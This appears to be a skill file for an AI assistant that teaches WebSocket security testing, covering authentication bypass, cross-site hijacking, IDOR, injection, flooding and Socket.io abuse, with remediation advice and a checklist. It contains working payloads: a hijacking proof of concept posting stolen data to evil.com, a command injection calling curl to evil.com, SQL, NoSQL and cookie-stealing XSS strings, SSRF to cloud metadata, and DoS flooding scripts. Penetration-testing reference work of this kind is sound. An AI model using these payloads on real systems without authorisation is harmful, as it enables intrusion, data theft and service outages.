---
name: websocket-security
description: >
  Expert guidance for testing WebSocket security vulnerabilities. Covers WebSocket authentication
  bypass, CSWSH (Cross-Site WebSocket Hijacking), authorization flaws, injection attacks (SQLi,
  XSS, command injection via messages), message tampering, insecure data transmission, subprotocol
  abuse, socket.io security, mass assignment in messages, DoS via message flooding, and WebSocket
  enumeration. Use this skill whenever the user mentions WebSocket security, CSWSH, WebSocket
  authentication, WebSocket injection, WebSocket hijacking, socket.io vulnerabilities, WebSocket
  message tampering, wss:// security, WebSocket authorization, or WebSocket testing. Also trigger
  for "how do I test WebSockets", "WebSocket security testing", "intercept WebSocket messages",
  "WebSocket CSRF", "exploit WebSocket", "ws:// vs wss://". Always use this skill for any
  WebSocket security question.
---

# WebSocket Security Skill

WebSockets maintain persistent bidirectional connections. Security flaws differ from HTTP — no
automatic CSRF protection, stateful sessions, and different auth models.

---

## 1. Attack Surface Map — Start Here

| Scenario | Section |
|----------|---------|
| Authentication bypass / no auth | §3.1 |
| CSWSH (Cross-Site WebSocket Hijacking) | §3.2 |
| Authorization / IDOR in messages | §3.3 |
| Injection via WebSocket messages | §3.4 |
| Message manipulation / tampering | §3.5 |
| Insecure `ws://` (no TLS) | §3.6 |
| Handshake header abuse | §3.7 |
| DoS via message flooding | §3.8 |
| Socket.io specific issues | §3.9 |
| Subprotocol enumeration | §3.10 |

---

## 2. Core Concepts

- **WebSocket handshake** — Starts as HTTP, upgrades via `Upgrade: websocket` header.
- **CSWSH** — Like CSRF but for WebSockets: browser sends credentials on connect automatically.
- **Origin check** — Server should validate `Origin` header during handshake (many don't).
- **No CSRF token** — WebSocket connections have no built-in CSRF protection.
- **Persistent state** — Auth happens once at connect; per-message auth often missing.
- **ws:// vs wss://** — `ws://` is unencrypted; intercept on network like HTTP.

---

## 3. Attack Techniques

### 3.1 Authentication Bypass

```javascript
// Test 1: Connect with no credentials
const ws = new WebSocket("wss://target.com/ws");
ws.onopen = () => {
    ws.send(JSON.stringify({"action":"get_user_data","user_id":1}));
};
ws.onmessage = e => console.log(e.data);

// Test 2: Connect with expired/invalid token
const ws = new WebSocket("wss://target.com/ws", [], {
    headers: {"Authorization": "Bearer expired-or-invalid-token"}
});

// Test 3: Token in URL vs header — try both
const ws1 = new WebSocket("wss://target.com/ws?token=INVALID");
const ws2 = new WebSocket("wss://target.com/ws");  // no token at all

// Test 4: Re-use old connection (session doesn't expire)
// Log in → get WS token → log out → try to use old WS token
```

```bash
# Using wscat (CLI WebSocket client)
npm install -g wscat

# Connect without auth
wscat -c "wss://target.com/ws"

# Connect with expired/invalid token
wscat -c "wss://target.com/ws" \
      -H "Authorization: Bearer INVALID" \
      -H "Cookie: session=EXPIRED"

# Once connected, send messages
> {"action":"get_admin_data"}
> {"action":"list_users"}
> {"type":"subscribe","channel":"admin"}
```

---

### 3.2 CSWSH — Cross-Site WebSocket Hijacking

Browser automatically sends cookies when a WebSocket is opened from any origin.
If the server only checks cookie (not Origin), an attacker site can hijack the connection.

```javascript
// CSWSH PoC — attacker's site (evil.com) steals victim's WS session
<!DOCTYPE html>
<html>
<body>
<script>
// Victim visits evil.com while logged into target.com
// Browser sends session cookie to target.com automatically!
var ws = new WebSocket("wss://target.com/ws");

ws.onopen = function() {
    // Send as if we're the victim
    ws.send(JSON.stringify({"action":"get_messages"}));
    ws.send(JSON.stringify({"action":"get_profile"}));
    ws.send(JSON.stringify({"action":"get_payment_methods"}));
};

ws.onmessage = function(event) {
    // Exfiltrate all data back to attacker
    fetch("https://evil.com/steal", {
        method: "POST",
        body: event.data,
        headers: {"Content-Type": "application/json"}
    });
};

ws.onerror = function(e) {
    document.write("Origin check in place: " + JSON.stringify(e));
};
</script>
</body>
</html>
```

```bash
# Check if Origin validation is in place
# Use Burp Suite — intercept WebSocket handshake, change Origin header:
# Upgrade: websocket
# Origin: https://evil.com   ← change this
# → If connection succeeds → no Origin validation → CSWSH possible

# In Burp: Proxy → WebSocket history → find upgrade request → Send to Repeater
# Change Origin and see if handshake completes (101 Switching Protocols)
```

---

### 3.3 Authorization / IDOR in Messages

```javascript
// Test: access another user's data via message
const ws = new WebSocket("wss://target.com/ws");
ws.onopen = () => {
    // Your user_id might be 1337 — try 1338
    ws.send(JSON.stringify({"action":"get_messages","user_id":1338}));
    ws.send(JSON.stringify({"action":"get_profile","user_id":1}));  // admin?
    ws.send(JSON.stringify({"action":"delete_account","user_id":1338}));
    
    // Vertical escalation
    ws.send(JSON.stringify({"action":"admin_list_users"}));
    ws.send(JSON.stringify({"action":"get_admin_panel"}));
    ws.send(JSON.stringify({"type":"subscribe","channel":"admin_events"}));
};

// Mass assignment in WS messages (same as HTTP mass assignment)
ws.send(JSON.stringify({
    "action":"update_profile",
    "user_id":1337,
    "name":"test",
    "role":"admin",        // try adding privileged fields
    "is_admin":true,
    "balance":99999
}));
```

---

### 3.4 Injection via WebSocket Messages

```javascript
// SQL Injection
ws.send(JSON.stringify({"action":"search","query":"test' OR 1=1--"}));
ws.send(JSON.stringify({"action":"get_user","id":"1 UNION SELECT password FROM users--"}));

// NoSQL Injection
ws.send(JSON.stringify({"action":"login","user":{"$gt":""},"pass":{"$gt":""}}));

// XSS via stored message
ws.send(JSON.stringify({
    "action":"send_message",
    "to":1338,
    "content":"<img src=x onerror=alert(document.cookie)>"
}));

// Command injection (if messages trigger server-side operations)
ws.send(JSON.stringify({"action":"ping","host":"127.0.0.1; id"}));
ws.send(JSON.stringify({"action":"export","filename":"report.pdf; curl http://evil.com/$(id)"}));

// Path traversal
ws.send(JSON.stringify({"action":"read_file","path":"../../etc/passwd"}));

// SSRF via URL in message
ws.send(JSON.stringify({"action":"fetch_url","url":"http://169.254.169.254/latest/meta-data/"}));
```

---

### 3.5 Message Manipulation / Tampering

```bash
# Use Burp Suite to intercept and modify WebSocket messages
# Proxy → WebSockets → right-click message → "Intercept WS messages"

# What to modify:
# 1. Change user_id to another user's ID (IDOR)
# 2. Add privileged fields (is_admin, role)
# 3. Inject SQL/code into string fields
# 4. Change action/type to admin actions
# 5. Change amounts (e.g., transfer 100 → -100 or 999999)

# Replay attacks — can old messages be replayed?
# Capture a "transfer funds" message and send it again
# No sequence numbers → potential replay

# Message sequence bypass
# Some apps enforce order: auth → action
# Try sending action message before auth message
```

---

### 3.6 Insecure `ws://` (No TLS)

```bash
# ws:// connections are unencrypted — intercept with proxy or on network

# Check if site uses ws:// instead of wss://
# Look in page source:
grep -i "ws://" index.html
# Browser DevTools → Network → WS filter → check URL scheme

# With Burp — ws:// automatically proxied if configured
# Can MITM on local network: arpspoof + Burp transparent proxy

# Mixed content: page on HTTPS but WS on ws:// — browser may block
# But if attacker is on network — can intercept
```

---

### 3.7 Handshake Header Abuse

```bash
# The WebSocket handshake is an HTTP upgrade request
# Headers present during handshake:
# - Cookie (sent automatically by browser)
# - Origin (can be set by non-browser tools)
# - Sec-WebSocket-Key (random, base64)
# - Sec-WebSocket-Protocol (subprotocol)

# Test: inject into Sec-WebSocket-Protocol (sometimes reflected)
# Burp Repeater with WebSocket upgrade:
GET /ws HTTP/1.1
Host: target.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13
Sec-WebSocket-Protocol: chat, <script>alert(1)</script>
Origin: https://evil.com

# Test custom headers that might affect routing
X-Forwarded-Host: admin.target.com
X-Real-IP: 127.0.0.1
```

---

### 3.8 DoS via Message Flooding

```python
import asyncio, websockets, json

async def flood():
    async with websockets.connect("wss://target.com/ws",
                                   extra_headers={"Cookie":"session=TOKEN"}) as ws:
        # Flood with large messages
        large = "A" * 100000
        for i in range(10000):
            await ws.send(json.dumps({"action":"search","query":large}))
            
        # Or open many connections
        # (run from multiple threads/tasks)

asyncio.run(flood())

# Connection flooding
import threading, websocket

def connect():
    ws = websocket.create_connection("wss://target.com/ws")
    import time; time.sleep(60)  # hold connection

for _ in range(500):
    threading.Thread(target=connect).start()
```

---

### 3.9 Socket.io Specific Issues

```javascript
// Socket.io uses event-based messaging — test all events

// Connect
const socket = io("https://target.com", {
    auth: { token: "YOUR-TOKEN" }
});

// Enumerate events (if debug mode on)
socket.onAny((event, ...args) => {
    console.log("Event:", event, args);
});

// Try emitting admin events
socket.emit("admin:list_users", {}, (response) => console.log(response));
socket.emit("admin:delete_user", {id: 1338});
socket.emit("join_room", "admin_room");

// Namespace abuse
// Try connecting to admin namespace
const adminSocket = io("https://target.com/admin");
const internalSocket = io("https://target.com/internal");

// Volatile messages bypass (fire-and-forget, no ack)
socket.volatile.emit("sensitive_action", {user_id: 1338});

// Socket.io handshake token leak
// Check: GET /socket.io/?EIO=4&transport=polling
// May expose session info in response
fetch("https://target.com/socket.io/?EIO=4&transport=polling")
    .then(r => r.text())
    .then(console.log);
```

---

### 3.10 Subprotocol Enumeration

```bash
# WebSocket can negotiate a subprotocol during handshake
# Sec-WebSocket-Protocol header in upgrade request

# Common subprotocols to try:
chat, json, binary, text, mqtt, wamp, soap, graphql-ws, graphql-transport-ws

# GraphQL over WebSocket
wscat -c "wss://target.com/graphql-ws" -H "Sec-WebSocket-Protocol: graphql-ws"
# After connect:
> {"type":"connection_init","payload":{}}
> {"id":"1","type":"start","payload":{"query":"{ __schema { types { name } } }"}}

# MQTT over WebSocket (IoT)
wscat -c "wss://target.com:8884/mqtt" -H "Sec-WebSocket-Protocol: mqtt"
```

---

## 4. WebSocket Testing with Burp Suite

```
1. Enable WebSocket interception:
   Proxy → Options → Intercept WebSocket messages ✓

2. View WS history:
   Proxy → WebSockets history

3. Intercept and modify messages:
   - Right-click WS message → Send to Repeater
   - Modify message in Repeater and resend

4. Burp Scanner:
   - Active scan on WS endpoints
   - Checks for reflected content, injection

5. CSWSH test:
   - Intercept handshake → change Origin header → check if still accepted
   - 101 Switching Protocols = Origin not validated

6. Turbo Intruder for WS:
   - Race conditions in message handling
```

---

## 5. Remediation

1. **Validate Origin header** during WebSocket handshake — reject unknown origins.
2. **Use CSRF tokens** in the handshake URL or first message.
3. **Authenticate every connection** — don't rely solely on session cookies.
4. **Authorize every message** — don't assume user is allowed to access all data.
5. **Use `wss://`** — never `ws://` in production.
6. **Input validation** — sanitize all fields in WebSocket messages same as HTTP params.
7. **Rate limiting** — limit messages per connection per second.
8. **Message size limits** — reject oversized messages.
9. **Sequence numbers** — prevent replay attacks on sensitive operations.

---

## 6. WebSocket Testing Checklist

- [ ] Connect without authentication — does it work?
- [ ] Connect with expired/invalid token
- [ ] Check Origin header validation (change to evil.com in Burp)
- [ ] Build CSWSH PoC if no Origin validation
- [ ] Send messages with different user_id values (IDOR)
- [ ] Try admin actions from regular user connection
- [ ] Inject SQL in every string field
- [ ] Inject XSS in every user-content field
- [ ] Try command injection in action/operation fields
- [ ] Test SSRF via URL fields in messages
- [ ] Check for `ws://` (unencrypted)
- [ ] Try mass assignment in message payloads
- [ ] Test Socket.io namespaces and admin events
- [ ] Test message replay (can you resend sensitive messages?)
- [ ] Test message flooding for rate limiting
